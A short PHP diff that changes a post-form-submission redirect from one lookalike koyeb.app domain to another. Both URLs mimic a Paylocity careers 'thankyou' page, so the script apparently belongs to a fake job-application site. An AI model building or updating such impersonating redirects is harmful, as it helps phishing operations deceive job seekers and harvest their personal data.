@@ -177,7 +177,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 
 
-    header("Location:https://paylocity-hrlive.koyeb.app/www.paylocity.com/careers/all-listings.job.34092/thankyou.html");
+    header("Location:https://thepaylocity.koyeb.app/www.paylocity.com/careers/all-listings.job.34092/thankyou.html");
 exit;
 }
 ?>
